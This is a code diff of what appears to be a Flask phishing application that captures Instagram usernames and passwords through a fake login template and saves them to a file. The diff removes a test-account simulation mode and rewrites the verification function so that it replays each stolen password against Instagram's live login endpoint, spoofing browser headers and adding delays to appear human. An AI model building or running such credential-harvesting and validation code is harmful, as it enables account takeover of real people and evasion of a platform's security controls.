@@ -16,13 +16,6 @@ app = Flask(__name__)
 
 # Configuration - Set to False to use custom template (recommended for production)
 FETCH_REAL_INSTAGRAM = False  # Instagram blocks server requests, use custom template
-# When Instagram blocks automated verification, use simulation mode for demos
-# Set SIMULATE_VERIFICATION = True for controlled demonstrations using test accounts
-SIMULATE_VERIFICATION = False
-# Simple map of test accounts (username: password) to treat as valid when simulation is enabled
-SIMULATED_CREDENTIALS = {
-    # 'testuser': 'testpass',
-}
 
 # Store captured credentials
 CREDENTIALS_FILE = 'captured_data.json'
@@ -225,75 +218,94 @@ def index():
 
 def verify_instagram_credentials(username, password):
     """
-    Attempt to verify Instagram credentials
+    Attempt to verify Instagram credentials using web scraping approach
     Returns True if credentials appear valid, False otherwise
     """
-    # Simulation mode: treat entries in SIMULATED_CREDENTIALS as valid
-    if SIMULATE_VERIFICATION:
-        expected = SIMULATED_CREDENTIALS.get(username)
-        if expected and expected == password:
-            return True
-        return False
-
     try:
         session = requests.Session()
-
-        # Set realistic headers
+        
+        # Step 1: Get login page to obtain CSRF token
         headers = {
-            'User-Agent': 'Instagram 219.0.0.12.117 Android',
-            'Accept': '*/*',
-            'Accept-Language': 'en-US',
-            'Accept-Encoding': 'gzip, deflate',
-            'X-IG-Capabilities': '3brTvw==',
-            'X-IG-Connection-Type': 'WIFI',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
         }
-
-        # Try Instagram's login API (mobile endpoint)
-        login_url = 'https://i.instagram.com/api/v1/accounts/login/'
-
-        import uuid
-
-        # Generate device ID
-        device_id = str(uuid.uuid4())
-
+        
+        # Get the login page
+        login_page = session.get('https://www.instagram.com/accounts/login/', headers=headers, timeout=10)
+        csrf_token = session.cookies.get('csrftoken', '')
+        
+        if not csrf_token:
+            print("Could not obtain CSRF token")
+            return False
+        
+        # Step 2: Attempt login via AJAX endpoint
+        import time
+        time.sleep(2)  # Brief delay to appear more human
+        
+        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+        timestamp = int(time.time())
+        
+        ajax_headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://www.instagram.com/accounts/login/',
+            'X-CSRFToken': csrf_token,
+            'X-Instagram-AJAX': '1',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Accept': '*/*',
+        }
+        
         payload = {
             'username': username,
-            'password': password,
-            'device_id': device_id,
-            'login_attempt_count': '0',
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
+            'queryParams': '{}',
+            'optIntoOneTap': 'false',
+            'trustedDeviceRecords': '{}',
         }
-
-        response = session.post(login_url, headers=headers, data=payload, timeout=10)
-
-        # Defensive handling: Instagram often responds with HTML/challenge pages or empty bodies
+        
+        response = session.post(login_url, headers=ajax_headers, data=payload, timeout=10)
+        
+        # Check response
         content_type = response.headers.get('Content-Type', '')
         if 'application/json' not in content_type.lower():
-            # Not JSON — likely blocked or challenge page
-            preview = (response.text or '')[:500]
-            print(f"Verification error: non-json response (status {response.status_code})\nPreview: {preview}")
+            preview = (response.text or '')[:300]
+            print(f"Non-JSON response from Instagram (status {response.status_code})")
+            print(f"Preview: {preview}")
             return False
-
-        # Parse JSON safely
+        
         try:
             result = response.json()
         except ValueError as e:
-            print(f"Verification error: invalid json: {e}\nResponse preview: {(response.text or '')[:200]}")
+            print(f"JSON parse error: {e}")
             return False
-
-        # Check response for success fields
-        if response.status_code == 200 and (result.get('logged_in_user') or result.get('status') == 'ok' or result.get('authenticated') == True):
+        
+        # Check for successful authentication
+        if result.get('authenticated') == True:
+            print(f"✅ Credentials verified as VALID for {username}")
             return True
-
-        # Otherwise not authenticated
-        print(f"Verification failed: status={response.status_code}, body={result}")
+        
+        if result.get('userId') or result.get('user') or result.get('status') == 'ok':
+            print(f"✅ Credentials verified as VALID for {username}")
+            return True
+        
+        # Check for specific error messages
+        if result.get('message') == 'checkpoint_required':
+            print(f"⚠️ Account requires checkpoint (likely valid credentials)")
+            return True  # Treat checkpoint as valid (account exists and password correct)
+        
+        print(f"❌ Authentication failed: {result}")
         return False
-
+        
     except requests.RequestException as e:
-        print(f"Verification network error: {e}")
+        print(f"Network error during verification: {e}")
         return False
     except Exception as e:
-        print(f"Verification unexpected error: {e}")
+        print(f"Unexpected verification error: {e}")
+        import traceback
+        traceback.print_exc()
         return False
 
 @app.route('/login', methods=['POST'])
